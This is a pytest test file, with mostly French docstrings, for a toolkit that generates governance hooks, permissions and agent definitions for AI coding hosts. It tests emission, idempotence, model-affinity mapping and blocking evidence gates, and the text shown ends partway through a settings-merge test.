"""Tests for the host surface layer: collection, emission, decisions, wire format.

The promise under test is narrow and checkable: one description of the project,
the same governance decision on every host, and a refusal that actually refuses
where the host can refuse.
"""

from __future__ import annotations

import json
from dataclasses import replace
from pathlib import Path

import pytest

from grimoire.bridges.schemas import HostId
from grimoire.core import layout
from grimoire.core.agentic_standard import setup_standard_profile
from grimoire.core.claude_activation import activation_context_text
from grimoire.hosts.capabilities import gaps_for, profile_for, resolve_host
from grimoire.hosts.collect import build_surface, collect_agents, default_permissions, infer_tools, parse_frontmatter
from grimoire.hosts.decisions import (
    DECISIONS,
    Decision,
    HookInput,
    Outcome,
    classify_tool,
    decide_activation,
    decide_context_capsule,
    decide_evidence_gate,
    decide_evidence_trace,
    decide_subagent_gate,
    decide_tool_policy,
    entry_persona_context,
)
from grimoire.hosts.emitters import apply_plan, emitter_for, supported_hosts
from grimoire.hosts.emitters.claude_code import _matcher
from grimoire.hosts.runtime import normalize_input, parse_event, render, run_hook
from grimoire.hosts.secrets import SECRET_RULES, secret_read_globs
from grimoire.hosts.surface import Enforcement, HookEvent, HookSpec, ToolVerb

AGENT_DIR = Path("_grimoire/_config/custom/agents")


def _write_agent(
    root: Path,
    name: str,
    body: str,
    *,
    tools: str = "",
    reasoning: str = "medium",
    cost: str = "medium",
    max_turns: int | None = None,
    context: tuple[str, ...] = (),
    skills: tuple[str, ...] = (),
) -> None:
    (root / AGENT_DIR).mkdir(parents=True, exist_ok=True)
    header = [
        "---",
        f'name: "{name}"',
        f'description: "{name} — rôle de test"',
    ]
    if tools:
        header.append(f"tools: [{tools}]")
    header += [
        "model_affinity:",
        f"  reasoning: {reasoning}",
        "  context_window: medium",
        f"  cost: {cost}",
    ]
    if max_turns is not None:
        header.append(f"max_turns: {max_turns}")
    if context:
        rendered = ", ".join(f"'{c}'" for c in context)
        header.append(f"context: [{rendered}]")
    if skills:
        rendered_skills = ", ".join(f"'{s}'" for s in skills)
        header.append(f"skills: [{rendered_skills}]")
    header += [
        "---",
        "",
    ]
    (root / AGENT_DIR / f"{name}.md").write_text("\n".join(header) + body + "\n", encoding="utf-8")


def _write_skill(root: Path, slug: str) -> None:
    """Drop a minimal project-tier skill definition at ``_grimoire/kit/skills/<slug>.md``.

    Mirrors what the scaffolder copies for an archetype-shipped skill (issue
    #375) — the same tier :func:`grimoire.hosts.collect.collect_skills` reads
    to build the inventory that :func:`grimoire.hosts.collect.collect_agents`
    now resolves for itself by default (issue #423).
    """
    skill_dir = root / "_grimoire" / "kit" / "skills"
    skill_dir.mkdir(parents=True, exist_ok=True)
    (skill_dir / f"{slug}.md").write_text(
        f"---\nname: {slug}\ndescription: Skill de test {slug}\n---\nCorps du skill {slug}.\n",
        encoding="utf-8",
    )


def _write_minimal_task_board(root: Path) -> None:
    """Drop the one file ``_is_governed`` treats as a strong signal, nothing else.

    Deliberately lighter than :func:`setup_standard_profile`: that call also
    scaffolds a provider registry, which would add a "Fournisseurs :" line
    to the session context and break an equality check against the bare
    directive. A task board on its own is exactly the minimal fixture the
    diagnostic's non-regression case calls for (#551/#552).
    """
    board_dir = root / "_grimoire" / "standard"
    board_dir.mkdir(parents=True, exist_ok=True)
    (board_dir / "task-board.yaml").write_text("tasks: []\n", encoding="utf-8")


@pytest.fixture
def project(tmp_path: Path) -> Path:
    _write_agent(tmp_path, "concierge", "Tu tries et tu routes. Tu exécutes des diagnostics.")
    _write_agent(tmp_path, "scribe", "Tu rédiges la documentation.", reasoning="low")
    return tmp_path


@pytest.fixture
def governed(project: Path) -> Path:
    setup_standard_profile(project, profile_id="governed", task_id="bootstrap")
    return project


@pytest.fixture
def production(project: Path) -> Path:
    setup_standard_profile(project, profile_id="production", task_id="bootstrap")
    return project


# ── Collection ───────────────────────────────────────────────────────────────


def test_frontmatter_parsing_survives_a_leading_comment() -> None:
    text = "<!-- ARCHETYPE: meta -->\n---\nname: x\n---\ncorps"
    meta, body = parse_frontmatter(text)
    assert meta["name"] == "x"
    assert body.strip() == "corps"


def test_declared_tools_win_over_inference(project: Path) -> None:
    _write_agent(project, "auditor", "Tu rédiges et tu exécutes.", tools="'read'")
    by_name = {a.name: a for a in collect_agents(project)}
    assert by_name["auditor"].tools == (ToolVerb.READ,)
    assert by_name["auditor"].tools_origin == "declared"
    assert by_name["scribe"].tools_origin == "inferred"


def test_inference_grants_write_only_on_an_explicit_signal() -> None:
    assert ToolVerb.EDIT not in infer_tools("Tu observes et tu rapportes.", "")
    assert ToolVerb.EDIT in infer_tools("Tu rédiges la documentation.", "")
    assert ToolVerb.EXECUTE in infer_tools("Tu lances les tests.", "")


def test_an_unrendered_placeholder_name_is_not_a_collected_agent(project: Path) -> None:
    """Un gabarit non rendu (``name: "{{agent_tag}}"``) n'est pas un agent installé.

    ``layout.agent_identity`` — la lecture que le diagnostic emploie depuis
    #349 — n'y reconnaît aucun tag, donc aucune identité : ce fichier n'existe
    pas encore en tant qu'agent, seulement en tant que gabarit à compléter.
    ``collect_agents`` doit s'accorder sur ce point plutôt que retomber sur le
    nom de fichier (issue #381).
    """
    (project / AGENT_DIR / "custom-agent.md").write_text(
        '---\nname: "{{agent_tag}}"\ndescription: "{{agent_role}}"\n---\nCorps.\n',
        encoding="utf-8",
    )
    names = {a.name for a in collect_agents(project)}
    assert "custom-agent" not in names
    assert not [n for n in names if "{{" in n]


def test_installed_agents_et_collect_agents_nomment_pareil(project: Path) -> None:
    """Garde #381 : les deux lectures de « quel agent existe » s'accordent.

    ``layout.installed_agents()`` (diagnostic, outil d'ajout) et
    ``collect_agents()`` (construction de surface, ``host sync``, cockpit)
    répondent à la même question sur les mêmes fichiers — gabarit non rendu
    compris. Un même fichier nommé différemment selon le lecteur est
    exactement le défaut de #381.
    """
    (project / AGENT_DIR / "custom-agent.md").write_text(
        '---\nname: "{{agent_tag}}"\ndescription: "{{agent_role}}"\n---\nCorps.\n',
        encoding="utf-8",
    )
    installed_tags = set(layout.installed_agents(project))
    collected_names = {a.name for a in collect_agents(project)}
    assert installed_tags == collected_names


def test_collect_agents_resolves_its_own_skills_without_known_skills(tmp_path: Path) -> None:
    """Régression #423 : appeler ``collect_agents`` sans ``known_skills`` ne doit

    plus jamais faire échouer un agent qui déclare un skill réellement présent.
    Avant le correctif, ``known_skills`` non fourni retombait sur un ensemble
    vide (``known_skills or frozenset()``), donc *tout* skill référencé était
    « introuvable » — le défaut par défaut des agents d'archétype depuis
    #377/#387 (``skills:`` attaché) faisait planter tout appelant qui, comme
    ``entry_persona_context`` ou le porteur par catégorie de
    ``grimoire/proposals.py``, ne passait pas explicitement l'inventaire.
    """
    _write_skill(tmp_path, "meta-art-direction")
    _write_agent(tmp_path, "agent-optimizer", "Tu arbitres.", skills=("meta-art-direction",))

    (agent,) = [a for a in collect_agents(tmp_path) if a.name == "agent-optimizer"]
    assert agent.skills == ("meta-art-direction",)


def test_collect_agents_still_rejects_a_skill_that_truly_does_not_exist(tmp_path: Path) -> None:
    """La résolution automatique (#423) reste fail-closed sur un slug fantôme.

    Le correctif fait résoudre l'inventaire tout seul quand ``known_skills``
    n'est pas fourni ; il ne doit pas assouplir la garde pour autant, sinon
    une vraie faute de frappe redevient silencieuse.
    """
    from grimoire.core.exceptions import GrimoireAgentError

    _write_agent(tmp_path, "agent-optimizer", "Tu arbitres.", skills=("skill-qui-n-existe-pas",))

    with pytest.raises(GrimoireAgentError, match="skill-qui-n-existe-pas"):
        collect_agents(tmp_path)


def test_an_override_wins_over_the_kit_tier(tmp_path: Path) -> None:
    """La persona du projet doit gagner sur celle que le kit livre.

    Régression croisée entre la frontière kit/overrides et cette couche : tant
    que l'émetteur balayait les répertoires en direct, il projetait la
    définition du tier kit même quand le projet en avait posé une dans
    ``_grimoire/overrides/agents/``. Le wrapper généré pointait alors le
    fichier que la prochaine mise à jour réécrit, et la customisation
    disparaissait sans un mot.
    """
    for tier, body in ((layout.KIT_DIR, "Version livrée."), (layout.OVERRIDES_DIR, "Version du projet.")):
        directory = tmp_path / tier / layout.AGENTS_SUBDIR
        directory.mkdir(parents=True, exist_ok=True)
        (directory / "concierge.md").write_text(
            '---\nname: "concierge"\ndescription: "tri"\n---\n' + body + "\n", encoding="utf-8"
        )

    (concierge,) = [a for a in collect_agents(tmp_path) if a.name == "concierge"]
    assert concierge.definition_ref == f"{layout.OVERRIDES_DIR}/{layout.AGENTS_SUBDIR}/concierge.md"

    emitter = emitter_for(HostId.GITHUB_COPILOT)
    apply_plan(emitter.plan(build_surface(tmp_path), tmp_path), tmp_path)
    wrapper = (tmp_path / ".github/agents/concierge.agent.md").read_text(encoding="utf-8")
    assert concierge.definition_ref in wrapper
    assert f"{layout.KIT_DIR}/{layout.AGENTS_SUBDIR}/concierge.md" not in wrapper


def test_evidence_skill_appears_only_once_enrolled(project: Path) -> None:
    assert "grimoire-evidence" not in {s.slug for s in build_surface(project).skills}
    setup_standard_profile(project, profile_id="governed", task_id="bootstrap")
    assert "grimoire-evidence" in {s.slug for s in build_surface(project).skills}


def test_blocking_gate_hook_requires_enrolment(project: Path) -> None:
    assert not [h for h in build_surface(project).hooks if h.event is HookEvent.STOP]
    setup_standard_profile(project, profile_id="governed", task_id="bootstrap")
    stop = [h for h in build_surface(project).hooks if h.event is HookEvent.STOP]
    assert stop and stop[0].enforcement is Enforcement.BLOCKING


# ── Emission ─────────────────────────────────────────────────────────────────


def test_claude_surface_is_native_everywhere(governed: Path) -> None:
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(governed), governed), governed)
    assert (governed / ".claude/agents/concierge.md").is_file()
    assert (governed / ".claude/skills/grimoire-evidence/SKILL.md").is_file()
    assert (governed / ".claude/commands/grimoire-gate.md").is_file()
    settings = json.loads((governed / ".claude/settings.json").read_text(encoding="utf-8"))
    assert "Stop" in settings["hooks"]
    assert settings["permissions"]["deny"]


def test_a_hook_declared_on_subagent_start_is_wired_by_host_sync(governed: Path) -> None:
    """A3/B8 — l'événement existe désormais dans le vocabulaire host-neutre :
    un hook qui le cible atterrit dans ``.claude/settings.json`` sous
    ``SubagentStart``, au lieu de disparaître en silence (c'était le bug :
    `HookEvent` et l'émetteur ne connaissaient pas cet événement, donc rien ne
    pouvait le câbler, quoi que déclare un registre côté hôte)."""
    surface = build_surface(governed)
    extra = HookSpec(
        event=HookEvent.SUBAGENT_START,
        decision="grimoire.subagent-context",
        enforcement=Enforcement.ADVISORY,
        rationale="test",
    )
    surface = replace(surface, hooks=(*surface.hooks, extra))
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
    apply_plan(emitter.plan(surface, governed), governed)
    settings = json.loads((governed / ".claude/settings.json").read_text(encoding="utf-8"))
    assert "SubagentStart" in settings["hooks"]
    # Événement sans appel d'outil : pas de matcher à porter.
    assert "matcher" not in settings["hooks"]["SubagentStart"][0]


def test_a_hook_declared_on_post_tool_use_failure_is_wired_by_host_sync(governed: Path) -> None:
    surface = build_surface(governed)
    extra = HookSpec(
        event=HookEvent.POST_TOOL_USE_FAILURE,
        decision="grimoire.tool-failure",
        enforcement=Enforcement.ADVISORY,
        matcher=("execute",),
        rationale="test",
    )
    surface = replace(surface, hooks=(*surface.hooks, extra))
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
    apply_plan(emitter.plan(surface, governed), governed)
    settings = json.loads((governed / ".claude/settings.json").read_text(encoding="utf-8"))
    assert "PostToolUseFailure" in settings["hooks"]
    assert settings["hooks"]["PostToolUseFailure"][0]["matcher"] == "Bash"


def test_evidence_trace_matcher_covers_bash_calls(governed: Path) -> None:
    """Défaut vérifié : sans ``execute`` dans son matcher, ``grimoire.evidence-trace``

    ne recevait jamais ``Bash`` sur Claude Code (``_MATCHER_TABLE`` ne route
    ``Bash`` que via la famille ``execute``). Consequence réelle :
    ``_record_session_mutation`` ne comptait jamais une mutation faite en
    shell (``sed -i``, ``git commit``…), et ``evidence_gate.py`` laissait
    clore une tâche hors gate après une telle mutation.
    """
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(governed), governed), governed)
    settings = json.loads((governed / ".claude/settings.json").read_text(encoding="utf-8"))
    # ``grimoire.evidence-trace`` est le seul décideur câblé sur PostToolUse
    # (voir governance_hooks) : une seule entrée, son matcher doit couvrir Bash.
    assert "Bash" in settings["hooks"]["PostToolUse"][0]["matcher"].split("|")


def test_agent_tool_boundary_reaches_the_host_file(governed: Path) -> None:
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(governed), governed), governed)
    scribe = (governed / ".claude/agents/scribe.md").read_text(encoding="utf-8")
    assert "tools: 'Read, Glob, Grep, Edit, Write'" in scribe
    assert "model: 'haiku'" in scribe  # low reasoning demand


def test_a_declared_context_replaces_the_default_load_not_adds_to_it(governed: Path) -> None:
    """#379 — un agent qui déclare ``context:`` ne charge plus par défaut le
    contexte partagé (``_grimoire/_memory/shared-context.md``) : il charge le
    sien, et lui seul. Un agent qui ne déclare rien (``scribe``) reçoit le
    texte d'avant #379 à l'identique — la déclaration rétrécit, elle n'amute
    jamais par défaut."""
    (governed / "_grimoire/_memory").mkdir(parents=True, exist_ok=True)
    (governed / "_grimoire/_memory/notes-securite.md").write_text("Notes.", encoding="utf-8")
    _write_agent(
        governed,
        "sentinelle",
        "Tu surveilles la sécurité du dépôt.",
        context=("_grimoire/_memory/notes-securite.md",),
    )
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(governed), governed), governed)

    sentinelle = (governed / ".claude/agents/sentinelle.md").read_text(encoding="utf-8")
    assert "_grimoire/_memory/notes-securite.md" in sentinelle
    assert "shared-context.md" not in sentinelle

    scribe = (governed / ".claude/agents/scribe.md").read_text(encoding="utf-8")
    assert "Lis `_grimoire/_memory/shared-context.md` s'il existe" in scribe


_SYNTHETIC_SHARED_CONTEXT = (
    "# Contexte partagé du projet\n\n"
    + "\n".join(
        f"- Décision {i} : une ligne de contexte partagé que tout agent charge par défaut, "
        "qu'il en ait besoin ou non, et qui pèse à chaque activation."
        for i in range(1, 25)
    )
    + "\n"
)


def _synthetic_agent(slug: str, role: str) -> str:
    """Un agent de test à la taille d'un agent réel, sans dépendre des fichiers
    livrés par le kit — ceux-ci changent de forme dans d'autres lots (#375), et
    un test qui les lisait depuis ``origin/main`` n'avait pas cette référence
    dans la CI. Seule la nature du rôle change entre les trois cas."""
    body = "\n".join(
        f"{i}. {role} — étape de raisonnement numéro {i}, décrite avec le niveau de détail "
        "d'une persona livrée, pour que la mesure porte sur une taille réaliste."
        for i in range(1, 21)
    )
    return (
        "---\n"
        f'name: "{slug}"\n'
        f'description: "{slug} — {role}"\n'
        'tools: "read, search"\n'
        f'use_when: "Quand la tâche relève de : {role}."\n'
        'dont_use_when: "Quand une lecture directe suffit."\n'
        f'tool_boundary: "Lecture transverse — {role}."\n'
        "---\n"
        f"# {slug}\n\n{body}\n"
    )


def _inject_context_declaration(raw: str, context_path: str) -> str:
    """Insère ``context: [...]`` dans le frontmatter de *raw*, juste avant le
    ``---`` de fermeture — sans toucher au reste du fichier source."""
    lines = raw.splitlines()
    dashes = [i for i, line in enumerate(lines) if line.strip() == "---"]
    closing = dashes[1]  # premier `---` = ouverture, second = fermeture
    lines.insert(closing, f"context: ['{context_path}']")
    return "\n".join(lines) + "\n"


@pytest.mark.parametrize(
    "slug,role",
    [
        ("nav-agent", "navigation dans le projet"),
        ("memoire-agent", "qualité de la mémoire"),
        ("securite-agent", "audit de sécurité"),
    ],
)
def test_declaring_context_measurably_shrinks_what_activation_loads(tmp_path: Path, slug: str, role: str) -> None:
    """#379 — mesure avant/après sur trois agents synthétiques de nature
    différente, à la taille d'un agent réel, sans dépendre des fichiers livrés.

    « Avant » = ce que cet agent charge sans déclaration : le fichier d'agent
    émis, plus le contexte partagé du projet (``_grimoire/_memory/shared-
    context.md``, taille réelle prise sur le gabarit du kit) que l'instruction
    par défaut lui fait lire, existe-t-il ou non le concerne — c'est aussi ce
    qu'il chargeait avant #379, le témoin. « Après » = le même agent, augmenté
    d'une déclaration ``context:`` minimale, plus le seul fichier qu'elle
    nomme : le contexte partagé disparaît de ce qu'il charge, remplacé par ce
    qu'il a réellement demandé.
    """
    from grimoire.tools._common import estimate_tokens

    raw = _synthetic_agent(slug, role)
    shared_context_body = _SYNTHETIC_SHARED_CONTEXT

    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None

    before_root = tmp_path / "avant"
    (before_root / "_grimoire/_memory").mkdir(parents=True, exist_ok=True)
    (before_root / "_grimoire/_memory/shared-context.md").write_text(shared_context_body, encoding="utf-8")
    (before_root / AGENT_DIR).mkdir(parents=True, exist_ok=True)
    (before_root / AGENT_DIR / f"{slug}.md").write_text(raw, encoding="utf-8")
    apply_plan(emitter.plan(build_surface(before_root), before_root), before_root)
    before_text = (before_root / ".claude/agents" / f"{slug}.md").read_text(encoding="utf-8")
    tokens_before = estimate_tokens(before_text) + estimate_tokens(shared_context_body)

    after_root = tmp_path / "apres"
    (after_root / "_grimoire/_memory").mkdir(parents=True, exist_ok=True)
    context_rel = f"_grimoire/_memory/{slug}-context.md"
    own_context_body = f"Contexte propre à {slug} : ce qu'il déclare, rien de plus."
    (after_root / context_rel).write_text(own_context_body, encoding="utf-8")
    (after_root / AGENT_DIR).mkdir(parents=True, exist_ok=True)
    (after_root / AGENT_DIR / f"{slug}.md").write_text(_inject_context_declaration(raw, context_rel), encoding="utf-8")
    apply_plan(emitter.plan(build_surface(after_root), after_root), after_root)
    after_text = (after_root / ".claude/agents" / f"{slug}.md").read_text(encoding="utf-8")
    tokens_after = estimate_tokens(after_text) + estimate_tokens(own_context_body)

    print(f"\n[{slug}] activation : {tokens_before} tokens avant -> {tokens_after} tokens après (#379)")

    assert "shared-context.md" in before_text, "le témoin sans déclaration garde le contexte partagé par défaut"
    assert "shared-context.md" not in after_text, "le contexte déclaré remplace le partagé, il ne s'y ajoute pas"
    assert context_rel in after_text
    assert tokens_after < tokens_before


def test_sub_agents_carry_effort_max_turns_and_background(governed: Path) -> None:
    """B10 — un sous-agent généré porte des bornes explicites : ``effort``,
    ``maxTurns``, et ``background`` pour tout ce qui n'est pas le point
    d'entrée. Sans elles, un sous-agent invisible tourne sans plafond."""
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(governed), governed), governed)
    scribe = (governed / ".claude/agents/scribe.md").read_text(encoding="utf-8")
    concierge = (governed / ".claude/agents/concierge.md").read_text(encoding="utf-8")

    assert "effort: 'low'" in scribe  # reasoning: low -> effort low
    assert "maxTurns: 30" in scribe  # défaut faute d'override
    assert "background: true" in scribe  # dispatché en invisible, pas le point d'entrée

    assert "effort: 'low'" in concierge  # reasoning: medium (défaut du fixture) -> effort low
    assert "background:" not in concierge, "le point d'entrée tourne en avant-plan, attendu par l'humain"


def test_high_reasoning_gets_high_effort(project: Path) -> None:
    _write_agent(project, "gros-cerveau", "Tu raisonnes beaucoup.", reasoning="high")
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(project), project), project)
    gros_cerveau = (project / ".claude/agents/gros-cerveau.md").read_text(encoding="utf-8")
    assert "effort: 'high'" in gros_cerveau


def test_max_turns_override_from_the_agent_file_wins(project: Path) -> None:
    _write_agent(project, "verbeux", "Tu écris beaucoup, il te faut plus de tours.", max_turns=80)
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(project), project), project)
    verbeux = (project / ".claude/agents/verbeux.md").read_text(encoding="utf-8")
    assert "maxTurns: 80" in verbeux


def test_claude_model_affinity_crosses_reasoning_and_cost(project: Path) -> None:
    """`reasoning` et `cost` se croisent : le premier signal fort gagne.

    - `cost: low` + `reasoning: medium` doit dégrader vers haiku : un agent
      qu'on veut bon marché ne doit pas hériter du modèle de session par
      défaut.
    - `reasoning: high` gagne toujours, même avec `cost: low` (cas réel du
      concierge : gros raisonnement de triage, invoqué à chaque tour) — le
      raisonnement fort ne doit jamais être rétrogradé pour l'économie.
    - Sans signal fort dans un sens ou l'autre (medium/medium), `inherit`
      reste le défaut honnête.
    """
    # `tools` diffère explicitement entre les deux : sans ça, les deux fiches
    # inférent la même frontière (read, search) et deviennent indiscernables
    # au sens de la garde de distinction (#372) — un faux positif ici, pas
    # une vraie régression, mais la garde n'a aucun moyen de le savoir.
    _write_agent(project, "petit-malin", "Tu triages à bas coût.", tools="'read'", reasoning="medium", cost="low")
    _write_agent(
        project,
        "gros-cerveau",
        "Tu raisonnes beaucoup, pour pas cher.",
        tools="'read', 'edit'",
        reasoning="high",
        cost="low",
    )
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(project), project), project)
    petit_malin = (project / ".claude/agents/petit-malin.md").read_text(encoding="utf-8")
    gros_cerveau = (project / ".claude/agents/gros-cerveau.md").read_text(encoding="utf-8")
    concierge = (project / ".claude/agents/concierge.md").read_text(encoding="utf-8")
    assert "model: 'haiku'" in petit_malin  # cost low prime sur reasoning medium
    assert "model: 'opus'" in gros_cerveau  # reasoning high prime sur cost low
    assert "model: 'inherit'" in concierge  # medium/medium : pas de signal fort


# ── Politique de dispatch (#329) ─────────────────────────────────────────────


def test_claude_entry_agent_carries_the_dispatch_policy(project: Path) -> None:
    """Le plan d'émission Claude Code porte la politique V0/V1/V2 + incertitudes.

    Seule la persona d'entrée route vers d'autres personas ; c'est donc son
    fichier — pas celui de chaque sous-agent — qui doit dire quel modèle
    correspond à quelle classe de vérifiabilité.
    """
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(project), project), project)
    entry = (project / ".claude/agents/concierge.md").read_text(encoding="utf-8")
    sub = (project / ".claude/agents/scribe.md").read_text(encoding="utf-8")

    assert "Politique de dispatch" in entry
    assert "V0" in entry and "haiku" in entry
    assert "V1" in entry and "sonnet" in entry
    assert "V2" in entry and "le modèle de la session" in entry
    assert "grimoire-uncertainties" in entry
    # Seule la persona d'entrée dispatche ; les autres n'en ont pas besoin.
    assert "Politique de dispatch" not in sub


def test_copilot_readme_documents_the_policy_without_inventing_a_model(governed: Path) -> None:
    """Le README Copilot porte la même règle V0/V1/V2, jamais un nom de modèle.

    Cet hôte n'offre aucune sélection automatique équivalente à `inherit`
    (dégradation « model affinity » déjà déclarée) ; documenter la politique
    sans y coller `haiku`/`sonnet`/`opus` est la même discipline que
    l'émetteur applique déjà aux fichiers d'agent.
    """
    emitter = emitter_for(HostId.GITHUB_COPILOT)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(governed), governed), governed)
    readme = (governed / ".github/hooks/README.md").read_text(encoding="utf-8")

    assert "Politique de dispatch" in readme
    assert "V0" in readme and "V1" in readme and "V2" in readme
    assert "grimoire-uncertainties" in readme
    for invented_model in ("haiku", "sonnet", "opus", "gpt-", "gemini"):
        assert invented_model not in readme.lower()


def _write_providers_registry(root: Path, *, project: str = "demo") -> None:
    registry = f"""\
$schema: "grimoire-llm-provider-registry/v1"
metadata:
  project: "{project}"
  owner: ""
  policy: "No provider/model call outside this registry."
providers:
  - id: "anthropic"
    enabled: true
    provider_type: "hosted"
    allowed_capabilities: ["chat", "code"]
    default_models: ["claude-sonnet-4.6"]
    currency: "quota"
    invocation: "claude -p {{prompt}} --model {{model}}"
    models:
      - id: "claude-haiku-4.5"
        tier: "cheap"
      - id: "claude-sonnet-4.6"
        tier: "mid"
    data_policy:
      allowed_data_classes: ["public-docs"]
      forbidden_data_classes: ["secrets"]
      retention_notes: ""
    fallback_order: []
    audit:
      log_prompts: false
      log_metadata: true
routing:
  default_provider: "anthropic"
  default_fallback_chain: []
  require_capability_match: true
  require_data_policy_match: true
"""
    registry_path = root / "_grimoire/standard/llm-provider-registry.yaml"
    registry_path.parent.mkdir(parents=True, exist_ok=True)
    registry_path.write_text(registry, encoding="utf-8")


def test_session_start_reports_providers_when_the_registry_exists(project: Path) -> None:
    _write_providers_registry(project)
    context = _session_start(project)
    assert "Fournisseurs : 1 disponibles, 0 refroidis, prochain cheap=anthropic" in context


def test_session_start_says_nothing_about_providers_without_a_registry(project: Path) -> None:
    context = _session_start(project)
    assert "Fournisseurs :" not in context


def test_session_start_reports_pending_proposals(project: Path) -> None:
    """Issue #395 : la ligne pointe vers le cockpit et la CLI, jamais vers du contenu."""
    from grimoire.hosts.decisions import record_agent_miss
    from grimoire.proposals import sync_proposals

    record_agent_miss(project, category="infra", specialty="terraform")
    record_agent_miss(project, category="infra", specialty="terraform")
    sync_proposals(project)

    context = _session_start(project)
    assert "1 proposition(s) d'artefact en attente" in context
    assert "grimoire proposals" in context


def test_session_start_says_nothing_about_proposals_without_any(project: Path) -> None:
    context = _session_start(project)
    assert "proposition(s) d'artefact" not in context


def test_copilot_surface_declares_its_permission_gap(governed: Path) -> None:
    emitter = emitter_for(HostId.GITHUB_COPILOT)
    assert emitter is not None
    plan = emitter.plan(build_surface(governed), governed)
    apply_plan(plan, governed)
    assert (governed / ".github/agents/concierge.agent.md").is_file()
    assert (governed / ".github/prompts/grimoire-gate.prompt.md").is_file()
    assert (governed / ".github/hooks/grimoire-stop.json").is_file()
    assert "permissions" in {d.surface for d in plan.degradations}


def test_copilot_agent_files_carry_the_wrapper_contract(governed: Path) -> None:
    """Contracts inherited from the scaffolder's wrappers, now owned here.

    `.github/agents/` had two writers: the scaffolder emitted a coarse wrapper
    and this emitter replaced it with one carrying the resolved tool boundary
    and the real definition path. The scaffolder no longer writes them, so the
    guarantees its tests pinned are pinned here instead.
    """
    emitter = emitter_for(HostId.GITHUB_COPILOT)
    assert emitter is not None
    apply_plan(emitter.plan(build_surface(governed), governed), governed)

    entry = (governed / ".github/agents/concierge.agent.md").read_text(encoding="utf-8")
    sub = (governed / ".github/agents/scribe.agent.md").read_text(encoding="utf-8")

    assert entry.startswith("---\n") and "description:" in entry
    # The entry point stays user-invocable; every other persona is routed.
    assert "user-invocable: false" not in entry
    assert "user-invocable: false" in sub
    # The wrapper must point at the file that actually holds the persona.
    assert "_grimoire/_config/custom/agents/concierge.md" in entry
    # ...and carry the boundary the surface resolved, not a fixed guess.
    assert "tools: ['read', 'search', 'edit']" in sub


def test_copilot_declares_the_model_affinity_gap_instead_of_guessing(governed: Path) -> None:
    """Copilot ne documente aucune valeur `model` de sélection automatique.

    Contrairement à Claude Code (`inherit`), le contrat VS Code pour
    `.github/agents/*.agent.md` n'offre qu'un nom de modèle explicite ou une
    liste de repli — rien qui corresponde à l'affinité `reasoning`/`cost` du
    projet. Inventer un nom de modèle serait une hallucination silencieuse ;
    la bonne réponse est de ne rien émettre, quelle que soit l'affinité de
    l'agent, et de le dire dans une dégradation explicite du plan.
    """
    emitter = emitter_for(HostId.GITHUB_COPILOT)
    assert emitter is not None
    plan = emitter.plan(build_surface(governed), governed)
    apply_plan(plan, governed)
    assert "model affinity" in {d.surface for d in plan.degradations}
    concierge = (governed / ".github/agents/concierge.agent.md").read_text(encoding="utf-8")
    assert "model:" not in concierge


def test_a_hand_written_copilot_wrapper_is_preserved(governed: Path) -> None:
    target = governed / ".github/agents/concierge.agent.md"
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("# Mon agent à moi\n", encoding="utf-8")
    emitter = emitter_for(HostId.GITHUB_COPILOT)
    assert emitter is not None
    result = apply_plan(emitter.plan(build_surface(governed), governed), governed)
    assert ".github/agents/concierge.agent.md" in result.skipped
    assert target.read_text(encoding="utf-8") == "# Mon agent à moi\n"


def test_prose_only_host_states_that_governance_is_not_enforced(governed: Path) -> None:
    emitter = emitter_for(HostId.CODEX)
    assert emitter is not None
    plan = emitter.plan(build_surface(governed), governed)
    apply_plan(plan, governed, force=True)
    catalog = (governed / "AGENTS.md").read_text(encoding="utf-8")
    assert "concierge" in catalog
    assert "ne sont pas opposables" in catalog
    assert {"subagents", "skills", "commands", "hooks"} <= {d.surface for d in plan.degradations}


@pytest.mark.parametrize("host_id", list(supported_hosts()))
def test_emission_is_idempotent(governed: Path, host_id: HostId) -> None:
    emitter = emitter_for(host_id)
    assert emitter is not None
    surface = build_surface(governed)
    apply_plan(emitter.plan(surface, governed), governed, force=True)
    again = apply_plan(emitter.plan(build_surface(governed), governed), governed)
    assert not again.written, f"{host_id.value} réécrit : {again.written}"


def test_a_hand_written_file_is_never_silently_replaced(governed: Path) -> None:
    target = governed / ".claude/agents/concierge.md"
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("écrit à la main\n", encoding="utf-8")
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
    result = apply_plan(emitter.plan(build_surface(governed), governed), governed)
    assert ".claude/agents/concierge.md" in result.skipped
    assert target.read_text(encoding="utf-8") == "écrit à la main\n"
    forced = apply_plan(emitter.plan(build_surface(governed), governed), governed, force=True)
    assert ".claude/agents/concierge.md" in forced.written


def test_settings_merge_preserves_foreign_configuration(governed: Path) -> None:
    settings = governed / ".claude/settings.json"
    settings.parent.mkdir(parents=True, exist_ok=True)
    settings.write_text(
        json.dumps(
            {
                "model": "opus",
                "hooks": {
                    "SessionStart": [
                        {"hooks": [{"type": "command", "command": "grimoire standard activation-context"}]},
                        {"hooks": [{"type": "command", "command": "echo maison"}]},
                    ]
                },
                "permissions": {"deny": ["Read(./privé)"]},
            }
        ),
        encoding="utf-8",
    )
    emitter = emitter_for(HostId.CLAUDE_CODE_CLI)
    assert emitter is not None
